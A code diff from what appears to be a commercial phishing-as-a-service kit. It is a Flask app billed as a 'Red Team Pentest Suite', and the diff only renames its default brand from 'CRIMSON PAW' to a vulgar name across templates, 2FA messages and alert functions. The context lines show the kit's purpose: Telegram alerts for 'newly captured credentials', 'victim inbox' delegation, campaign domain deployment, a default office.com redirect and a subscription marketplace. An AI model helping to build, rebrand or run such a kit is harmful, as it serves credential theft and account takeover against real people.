@@ -68,8 +68,8 @@ HTML_TEMPLATE = r'''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{ platform_name or 'CRIMSON PAW' }} | Red Team Pentest Suite</title>
-    <link rel="icon" type="image/png" href="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}">
+    <title>{{ platform_name or 'SPEARCUNT' }} | Red Team Pentest Suite</title>
+    <link rel="icon" type="image/png" href="{{ custom_logo_url or '/static/img/spearcunt_logo.png' }}">
     <style>
         :root, [data-theme="crimson"] { 
             --bg-primary: #0a0709; 
@@ -499,7 +499,7 @@ HTML_TEMPLATE = r'''
         .settings-card { background: #f8f9fa; border: 1px solid var(--border-color); border-radius: 6px; padding: 16px; margin-bottom: 14px; font-size: 13px; }
         .settings-card h4 { margin-bottom: 8px; color: #201f1e; }
 
-        /* ── Extractor & Sorter Page (CRIMSON PAW THEME) ─────────── */
+        /* ── Extractor & Sorter Page (SPEARCUNT THEME) ─────────── */
         .extractor-viewport { display: flex; flex-direction: column; height: 100%; min-height: 0; background: var(--bg-primary); color: #f0ebed; font-family: 'Segoe UI', monospace; overflow: hidden; }
         .extractor-top-bar { display: flex; align-items: center; justify-content: space-between; padding: 14px 24px; background: var(--bg-sidebar); border-bottom: 1px solid var(--border-color); flex-shrink: 0; gap: 16px; }
         .extractor-title { font-size: 1.1em; font-weight: 800; color: #ffffff; letter-spacing: 0.05em; display: flex; align-items: center; gap: 10px; }
@@ -559,7 +559,7 @@ HTML_TEMPLATE = r'''
         .domain-group-header { display: flex; align-items: center; gap: 10px; padding: 6px 0 4px; color: var(--accent-color); font-weight: 700; font-size: 0.88em; border-bottom: 1px solid var(--border-color); margin-bottom: 4px; }
         .domain-badge { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 20px; padding: 2px 10px; font-size: 0.78em; color: var(--accent-color); font-weight: 700; }
 
-        /* ── B2B Sender (CRIMSON PAW THEME) ───────────────────────── */
+        /* ── B2B Sender (SPEARCUNT THEME) ───────────────────────── */
         .b2b-viewport { display:flex; flex-direction:column; height:100%; background:var(--bg-primary); color:#f0ebed; font-family:'Segoe UI',sans-serif; overflow:hidden; }
         .b2b-top-bar { display:flex; align-items:center; background:var(--bg-sidebar); border-bottom:1px solid var(--border-color); padding:0 18px; height:46px; gap:14px; flex-shrink:0; }
         .b2b-brand { font-size:.97em; font-weight:800; color:#ffffff; letter-spacing:.04em; white-space:nowrap; }
@@ -1044,10 +1044,10 @@ HTML_TEMPLATE = r'''
 <body class="{{ 'role-operator' if user_role == 'operator' else 'role-admin' }}">
     <div class="sidebar" id="sidebar">
         <button type="button" class="toggle-btn" id="sidebar-toggle-btn" onclick="toggleSidebar()" title="Collapse sidebar">❮</button>
-        <div class="sidebar-header" onclick="handleBrandLogoClick()" style="display:flex; align-items:center; gap:10px; cursor:pointer;" title="{{ platform_name or 'Crimson Paw' }}">
-            <img src="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}" style="width:28px; height:28px; border-radius:6px; border:1px solid var(--accent-glow); box-shadow:0 0 8px var(--accent-glow); object-fit:contain;">
+        <div class="sidebar-header" onclick="handleBrandLogoClick()" style="display:flex; align-items:center; gap:10px; cursor:pointer;" title="{{ platform_name or 'SpearCunt' }}">
+            <img src="{{ custom_logo_url or '/static/img/spearcunt_logo.png' }}" style="width:28px; height:28px; border-radius:6px; border:1px solid var(--accent-glow); box-shadow:0 0 8px var(--accent-glow); object-fit:contain;">
             <div style="display:flex; flex-direction:column; overflow:hidden;">
-                <span style="font-weight:900; letter-spacing:0.12em; color:#ffffff;">{{ platform_name or 'CRIMSON PAW' }}</span>
+                <span style="font-weight:900; letter-spacing:0.12em; color:#ffffff;">{{ platform_name or 'SPEARCUNT' }}</span>
                 <span id="sidebar-role-badge" style="font-size:9.5px; color:{{ '#58a6ff' if user_role == 'operator' else ('#a49498' if is_client_admin else 'var(--accent-color)') }}; font-weight:700; letter-spacing:0.06em;">{{ 'OPERATOR' if user_role == 'operator' else ('USER' if is_client_admin else 'ADMIN') }}</span>
             </div>
         </div>
@@ -3680,7 +3680,7 @@ HTML_TEMPLATE = r'''
                                     <label style="font-size: 10.5px; font-weight: 800; letter-spacing: 0.08em; color: #8e7d82; text-transform: uppercase;">
                                         PLATFORM / APP TITLE
                                     </label>
-                                    <input type="text" id="setting-platform-name" class="dm-input" value="{{ platform_name or 'CRIMSON PAW' }}" placeholder="e.g. ACME GATEWAY, APEX CYBER" style="background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box; outline: none;">
+                                    <input type="text" id="setting-platform-name" class="dm-input" value="{{ platform_name or 'SPEARCUNT' }}" placeholder="e.g. ACME GATEWAY, APEX CYBER" style="background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 16px; color: #ffffff; font-size: 13.5px; width: 100%; box-sizing: border-box; outline: none;">
                                     <span style="font-size: 11px; color: #a49498; margin-top: 2px;">Reflected across Dashboard, Sidebar, Landing Page, and Login title.</span>
                                 </div>
 
@@ -3689,7 +3689,7 @@ HTML_TEMPLATE = r'''
                                         PLATFORM LOGO (FILE UPLOAD OR URL)
                                     </label>
                                     <div style="display: flex; align-items: center; gap: 14px; background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 16px;">
-                                        <img id="theme-logo-preview" src="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}" style="width: 44px; height: 44px; border-radius: 8px; border: 1px solid var(--accent-glow); box-shadow: 0 0 10px var(--accent-glow); object-fit: contain; background: #000;">
+                                        <img id="theme-logo-preview" src="{{ custom_logo_url or '/static/img/spearcunt_logo.png' }}" style="width: 44px; height: 44px; border-radius: 8px; border: 1px solid var(--accent-glow); box-shadow: 0 0 10px var(--accent-glow); object-fit: contain; background: #000;">
                                         <div style="display: flex; flex-direction: column; gap: 6px; flex: 1;">
                                             <div style="display: flex; gap: 8px; align-items: center;">
                                                 <input type="file" id="logo-file-picker" accept=".png,.jpg,.jpeg,.svg,.webp,.ico" style="display: none;" onchange="handleLogoFileSelected(event)">
@@ -3998,7 +3998,7 @@ HTML_TEMPLATE = r'''
                 </div>
             </div>
             <p style="color:var(--text-secondary); font-size:0.88rem; line-height:1.55; margin-bottom:18px;">
-                Welcome to <span class="brand-text-dynamic">{{ platform_name or 'CRIMSON PAW' }}</span>! To ensure you receive real-time notifications for newly captured credentials and high-value inbox intelligence, please configure your two dedicated Telegram bots:
+                Welcome to <span class="brand-text-dynamic">{{ platform_name or 'SPEARCUNT' }}</span>! To ensure you receive real-time notifications for newly captured credentials and high-value inbox intelligence, please configure your two dedicated Telegram bots:
             </p>
             <div style="display:flex; flex-direction:column; gap:10px; margin-bottom:22px;">
                 <div style="background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; padding:12px; display:flex; align-items:flex-start; gap:10px;">
@@ -4860,7 +4860,7 @@ HTML_TEMPLATE = r'''
                 {% if is_master_admin %}
                 <div id="dm-tab-pane-search" style="display:flex; flex-direction:column; gap:14px;">
                     <div style="background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; padding:12px 14px; font-size:0.78rem; color:var(--text-secondary);">
-                        💡 <strong style="color:var(--text-primary);">Real-time Dynadot Registrar Integration:</strong> Search domain availability, compare live TLD rates, and register domains directly to your <span class="brand-text-dynamic">{{ platform_name or 'CRIMSON PAW' }}</span> infrastructure with automated DNS binding.
+                        💡 <strong style="color:var(--text-primary);">Real-time Dynadot Registrar Integration:</strong> Search domain availability, compare live TLD rates, and register domains directly to your <span class="brand-text-dynamic">{{ platform_name or 'SPEARCUNT' }}</span> infrastructure with automated DNS binding.
                     </div>
                     {% if is_master_admin %}
                     <div style="display:flex; gap:10px; align-items:center; background:rgba(255,255,255,0.03); border:1px solid var(--border-color); border-radius:8px; padding:10px 14px; font-size:0.78rem;">
@@ -4930,7 +4930,7 @@ HTML_TEMPLATE = r'''
                 <!-- TAB 3: Add Custom Domain -->
                 <div id="dm-tab-pane-manual" style="display:none; flex-direction:column; gap:14px;">
                     <div style="background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; padding:12px 14px; font-size:0.78rem; color:var(--text-secondary);">
-                        🌐 <strong style="color:var(--text-primary);">Bring Your Own Domain:</strong> Point your domain's DNS (A Record or Cloudflare Tunnel) to your <span class="brand-text-dynamic">{{ platform_name or 'CRIMSON PAW' }}</span> server and register it here to immediately use it in the deployment builder.
+                        🌐 <strong style="color:var(--text-primary);">Bring Your Own Domain:</strong> Point your domain's DNS (A Record or Cloudflare Tunnel) to your <span class="brand-text-dynamic">{{ platform_name or 'SPEARCUNT' }}</span> server and register it here to immediately use it in the deployment builder.
                     </div>
                     <div style="display:flex; flex-direction:column; gap:6px;">
                         <label style="font-size:0.74rem; font-weight:700; color:#a49498; text-transform:uppercase;">Domain Name</label>
@@ -4950,7 +4950,7 @@ HTML_TEMPLATE = r'''
                     </div>
                     {% endif %}
                     <div style="display:flex; justify-content:flex-end; margin-top:8px;">
-                        <button type="button" class="dm-btn" onclick="addCustomDomain()"><span>➕</span> Add Domain to <span class="brand-text-dynamic">{{ platform_name or 'CRIMSON PAW' }}</span></button>
+                        <button type="button" class="dm-btn" onclick="addCustomDomain()"><span>➕</span> Add Domain to <span class="brand-text-dynamic">{{ platform_name or 'SPEARCUNT' }}</span></button>
                     </div>
                 </div>
 
@@ -5119,7 +5119,7 @@ HTML_TEMPLATE = r'''
             const inboxes = sessions.length > 0 ? `${sessions.length} victim inbox(es) (${sessions.join(', ')})` : 'All delegated victim accounts';
 
             const infoText = 
-`CRIMSON PAW • Operator Account Info
+`SPEARCUNT • Operator Account Info
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Operator Name : ${username}
 Portal Link   : ${portalUrl}
@@ -9910,7 +9910,7 @@ Assigned      : ${inboxes}
             const c = _lastCreatedCredentials;
             if (!c.username) return;
             const text = 
-`CRIMSON PAW • Webmail Operator Credentials
+`SPEARCUNT • Webmail Operator Credentials
 ──────────────────────────────────────
 Codified Portal URL: ${c.portalUrl}
 Operator Identifier: ${c.username}
@@ -10838,7 +10838,7 @@ Log in to your private portal to deploy campaigns and track captures.`;
             }
 
             const infoText = 
-`CRIMSON PAW • Operator Account Info
+`SPEARCUNT • Operator Account Info
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Operator Name : ${username}
 Portal Link   : ${portalUrl}
@@ -11318,7 +11318,7 @@ Delegated     : ${inboxesDesc}
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         theme: currentSelectedTheme,
-                        platform_name: platformName || 'CRIMSON PAW',
+                        platform_name: platformName || 'SPEARCUNT',
                         custom_logo_url: logoUrl
                     })
                 });
@@ -15238,8 +15238,8 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{ platform_name or 'CRIMSON PAW' }} — Administrator Access</title>
-    <link rel="icon" type="image/png" href="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}">
+    <title>{{ platform_name or 'SPEARCUNT' }} — Administrator Access</title>
+    <link rel="icon" type="image/png" href="{{ custom_logo_url or '/static/img/spearcunt_logo.png' }}">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root, [data-theme="crimson"] { 
@@ -15450,8 +15450,8 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
 <body>
     <div class="login-card">
         <div class="brand-header">
-            <img src="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}" alt="{{ platform_name or 'Crimson Paw' }}" class="brand-logo" style="object-fit:contain;">
-            <div class="brand-title">{{ platform_name or 'CRIMSON PAW' }}</div>
+            <img src="{{ custom_logo_url or '/static/img/spearcunt_logo.png' }}" alt="{{ platform_name or 'SpearCunt' }}" class="brand-logo" style="object-fit:contain;">
+            <div class="brand-title">{{ platform_name or 'SPEARCUNT' }}</div>
             <div class="brand-subtitle">SuperAdmin Console</div>
         </div>
 
@@ -15491,7 +15491,7 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
             </div>
         </div>
 
-        <div class="footer-note">{{ platform_name or 'CRIMSON PAW' }} • SUPERADMIN CONSOLE</div>
+        <div class="footer-note">{{ platform_name or 'SPEARCUNT' }} • SUPERADMIN CONSOLE</div>
     </div>
 
     <!-- Master Superadmin Emergency Switch Modal -->
@@ -15896,8 +15896,8 @@ CRIMSON_PAW_CLIENT_LOGIN_HTML = r'''<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{ platform_name or 'CRIMSON PAW' }} — Client Portal Access</title>
-    <link rel="icon" type="image/png" href="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}">
+    <title>{{ platform_name or 'SPEARCUNT' }} — Client Portal Access</title>
+    <link rel="icon" type="image/png" href="{{ custom_logo_url or '/static/img/spearcunt_logo.png' }}">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root, [data-theme="crimson"] { 
@@ -16088,8 +16088,8 @@ CRIMSON_PAW_CLIENT_LOGIN_HTML = r'''<!DOCTYPE html>
 <body>
     <div class="login-card">
         <div class="brand-header">
-            <img src="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}" alt="{{ platform_name or 'Platform' }}" class="brand-logo" style="object-fit:contain;">
-            <div class="brand-title">{{ platform_name or 'CRIMSON PAW' }}</div>
+            <img src="{{ custom_logo_url or '/static/img/spearcunt_logo.png' }}" alt="{{ platform_name or 'Platform' }}" class="brand-logo" style="object-fit:contain;">
+            <div class="brand-title">{{ platform_name or 'SPEARCUNT' }}</div>
             <div class="brand-subtitle">Client Portal Access</div>
         </div>
 
@@ -16107,7 +16107,7 @@ CRIMSON_PAW_CLIENT_LOGIN_HTML = r'''<!DOCTYPE html>
             <button type="submit" id="btn-client-login" class="btn-submit">Sign In To Portal ❯</button>
         </form>
 
-        <div class="footer-note">{{ platform_name or 'CRIMSON PAW' }} • CLIENT ACCESS PORTAL</div>
+        <div class="footer-note">{{ platform_name or 'SPEARCUNT' }} • CLIENT ACCESS PORTAL</div>
     </div>
 
     <script>
@@ -16164,7 +16164,7 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CRIMSON PAW — Operator Mailbox Access</title>
-    <link rel="icon" type="image/png" href="/static/img/crimson_paw_logo.png">
+    <link rel="icon" type="image/png" href="/static/img/spearcunt_logo.png">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root, [data-theme="crimson"] { 
@@ -16388,8 +16388,8 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
 <body>
     <div class="portal-card">
         <div class="brand-header">
-            <img src="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}" alt="{{ platform_name or 'Crimson Paw' }}" class="brand-logo">
-            <div class="brand-title">{{ platform_name or 'CRIMSON PAW' }}</div>
+            <img src="{{ custom_logo_url or '/static/img/spearcunt_logo.png' }}" alt="{{ platform_name or 'SpearCunt' }}" class="brand-logo">
+            <div class="brand-title">{{ platform_name or 'SPEARCUNT' }}</div>
             <div class="brand-subtitle">Operator Access Gateway</div>
             <div class="portal-badge">PORTAL: /m/{{ token }}</div>
         </div>
@@ -16452,7 +16452,7 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
             </div>
         </div>
 
-        <div class="footer-note">CRIMSON PAW • RESTRICTED OPERATOR CONSOLE</div>
+        <div class="footer-note">SPEARCUNT • RESTRICTED OPERATOR CONSOLE</div>
     </div>
 
     <script>
@@ -17147,7 +17147,7 @@ def operator_codified_portal(token):
                     cfg = json.load(f)
             except Exception: pass
         active_theme = cfg.get('theme', 'crimson')
-        platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+        platform_name = cfg.get('platform_name', 'SPEARCUNT')
         custom_logo_url = cfg.get('custom_logo_url', '')
         resp = make_response(render_template_string(
             HTML_TEMPLATE,
@@ -17170,7 +17170,7 @@ def operator_codified_portal(token):
                 cfg = json.load(f)
         except Exception: pass
     active_theme = cfg.get('theme', 'crimson')
-    platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+    platform_name = cfg.get('platform_name', 'SPEARCUNT')
     custom_logo_url = cfg.get('custom_logo_url', '')
     resp = make_response(render_template_string(CRIMSON_PAW_OPERATOR_PORTAL_HTML, token=token, op=op, active_theme=active_theme, platform_name=platform_name, custom_logo_url=custom_logo_url))
     resp.set_cookie('last_operator_token', token, max_age=86400*30, httponly=True, samesite='Lax')
@@ -17255,7 +17255,7 @@ def api_operator_portal_auth(token):
     }
 
     msg_html = (
-        f"🛡️ <b>CRIMSON PAW • OPERATOR 2FA CODE</b>\n\n"
+        f"🛡️ <b>SPEARCUNT • OPERATOR 2FA CODE</b>\n\n"
         f"Portal: <code>/m/{token}</code>\n"
         f"Operator: <b>{op.get('username')}</b>\n"
         f"Your single-use login code is:\n"
@@ -17317,7 +17317,7 @@ def api_operator_portal_setup_2fa(token):
         'client_ip': _get_real_ip()
     }
     msg_html = (
-        f"🛡️ <b>CRIMSON PAW • INITIAL 2FA CODE</b>\n\n"
+        f"🛡️ <b>SPEARCUNT • INITIAL 2FA CODE</b>\n\n"
         f"Portal: <code>/m/{token}</code>\n"
         f"Your login verification code is:\n"
         f"👉 <code>{otp}</code>\n\n"
@@ -17396,7 +17396,7 @@ def api_operator_portal_resend_2fa(token):
         'attempts': 0
     }
     msg_html = (
-        f"🛡️ <b>CRIMSON PAW • RESENT 2FA CODE</b>\n\n"
+        f"🛡️ <b>SPEARCUNT • RESENT 2FA CODE</b>\n\n"
         f"Portal: <code>/m/{token}</code>\n"
         f"Your new login code is:\n"
         f"👉 <code>{otp}</code>\n\n"
@@ -17456,7 +17456,7 @@ def login_route():
                 cfg = json.load(f)
         except Exception: pass
     active_theme = cfg.get('theme', 'crimson')
-    platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+    platform_name = cfg.get('platform_name', 'SPEARCUNT')
     custom_logo_url = cfg.get('custom_logo_url', '')
     return render_template_string(CRIMSON_PAW_LOGIN_HTML, platform_name=platform_name, custom_logo_url=custom_logo_url, active_theme=active_theme)
 
@@ -17471,7 +17471,7 @@ def client_login_route():
                 cfg = json.load(f)
         except Exception: pass
     active_theme = cfg.get('theme', 'crimson')
-    platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+    platform_name = cfg.get('platform_name', 'SPEARCUNT')
     custom_logo_url = cfg.get('custom_logo_url', '')
     return render_template_string(CRIMSON_PAW_CLIENT_LOGIN_HTML, platform_name=platform_name, custom_logo_url=custom_logo_url, active_theme=active_theme)
 
@@ -17641,7 +17641,7 @@ def api_auth_login():
             }
 
             msg_html = (
-                f"🛡️ <b>CRIMSON PAW • ADMIN 2FA CODE</b>\n\n"
+                f"🛡️ <b>SPEARCUNT • ADMIN 2FA CODE</b>\n\n"
                 f"Your single-use login code is:\n"
                 f"👉 <code>{otp}</code>\n\n"
                 f"⏱️ <i>Code expires in 5 minutes.</i>\n"
@@ -17769,7 +17769,7 @@ def api_auth_resend_2fa():
     pend['expires_at'] = time.time() + 300
 
     msg_html = (
-        f"🛡️ <b>CRIMSON PAW • RESENT 2FA CODE</b>\n\n"
+        f"🛡️ <b>SPEARCUNT • RESENT 2FA CODE</b>\n\n"
         f"Your new login code is:\n"
         f"👉 <code>{otp}</code>\n\n"
         f"⏱️ <i>Expires in 5 minutes.</i>\n"
@@ -18165,7 +18165,7 @@ def index():
                 cfg = json.load(f)
         except Exception: pass
     active_theme = cfg.get('theme', 'crimson')
-    platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+    platform_name = cfg.get('platform_name', 'SPEARCUNT')
     custom_logo_url = cfg.get('custom_logo_url', '')
     marketplace_contact = (cfg.get('marketplace_telegram_contact', '') or '').strip().lstrip('@')
     # Formatted subscription-order deep-links: order details + buyer identity block.
@@ -18225,7 +18225,7 @@ def client_portal():
             pass
 
     active_theme = cfg.get('theme', 'crimson')
-    platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+    platform_name = cfg.get('platform_name', 'SPEARCUNT')
     custom_logo_url = cfg.get('custom_logo_url', '')
 
     return render_template_string(
@@ -18289,7 +18289,7 @@ def dashboard():
                 cfg = json.load(f)
         except Exception: pass
     active_theme = cfg.get('theme', 'crimson')
-    platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+    platform_name = cfg.get('platform_name', 'SPEARCUNT')
     custom_logo_url = cfg.get('custom_logo_url', '')
     is_client = bool(session.get('is_client_admin', False))
     if role == 'admin' and not is_client:
@@ -20081,7 +20081,7 @@ def api_keyword_alerts_test_telegram():
     if not chat_id:
         return jsonify({'success': False, 'message': 'Chat ID is required. Please enter your Telegram numerical user or group ID.'}), 400
 
-    brand_name = cfg.get('platform_name', 'CRIMSON PAW').strip() or 'CRIMSON PAW'
+    brand_name = cfg.get('platform_name', 'SPEARCUNT').strip() or 'SPEARCUNT'
     test_html = (
         f"🚨 <b>{brand_name} KEYWORD ALERT — BOT TEST</b> 🚨\n"
         "👤 <b>Victim:</b> Lizbeth Lozoya\n"
@@ -21912,7 +21912,7 @@ def get_platform_settings():
     if not is_session_master_admin():
         return jsonify({'error': 'Forbidden: Master administrator access required.'}), 403
     defaults = {
-        'platform_name': 'CRIMSON PAW',
+        'platform_name': 'SPEARCUNT',
         'theme': 'crimson',
         'custom_logo_url': '',
         'default_redirect': 'https://www.office.com/',
@@ -22099,7 +22099,7 @@ def _send_raw_alert(tg_html, wh_md, is_prt=False, owner_id=None):
 
         # 2. Discord / Slack Webhook Dispatch
         wh_url = cfg.get('webhook_url', '').strip()
-        brand_name = cfg.get('platform_name', 'CRIMSON PAW').strip() or 'CRIMSON PAW'
+        brand_name = cfg.get('platform_name', 'SPEARCUNT').strip() or 'SPEARCUNT'
         if wh_url:
             import urllib.request
             payload = json.dumps({
@@ -22129,7 +22129,7 @@ def test_platform_telegram():
                 with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
                     cfg = json.load(f)
             except Exception: pass
-        brand_name = cfg.get('platform_name', 'CRIMSON PAW').strip() or 'CRIMSON PAW'
+        brand_name = cfg.get('platform_name', 'SPEARCUNT').strip() or 'SPEARCUNT'
 
         import urllib.request
         now = datetime.datetime.now()
@@ -22175,7 +22175,7 @@ def test_platform_webhook():
                 with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
                     cfg = json.load(f)
             except Exception: pass
-        brand_name = cfg.get('platform_name', 'CRIMSON PAW').strip() or 'CRIMSON PAW'
+        brand_name = cfg.get('platform_name', 'SPEARCUNT').strip() or 'SPEARCUNT'
 
         import urllib.request
         payload = json.dumps({
@@ -22340,7 +22340,7 @@ def dispatch_victim_compromised_alert(user_code):
                 with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
                     cfg_plat = json.load(f)
             except Exception: pass
-        brand_name = cfg_plat.get('platform_name', 'CRIMSON PAW').strip() or 'CRIMSON PAW'
+        brand_name = cfg_plat.get('platform_name', 'SPEARCUNT').strip() or 'SPEARCUNT'
 
         # Exact 8-line layout matching user specification
         tg_html = (
@@ -22379,7 +22379,7 @@ def dispatch_alert(title, message, is_prt=False, owner_id=None):
             with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
                 cfg_plat = json.load(f)
         except Exception: pass
-    brand_name = cfg_plat.get('platform_name', 'CRIMSON PAW').strip() or 'CRIMSON PAW'
+    brand_name = cfg_plat.get('platform_name', 'SPEARCUNT').strip() or 'SPEARCUNT'
 
     now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     safe_title = html_escape(title)
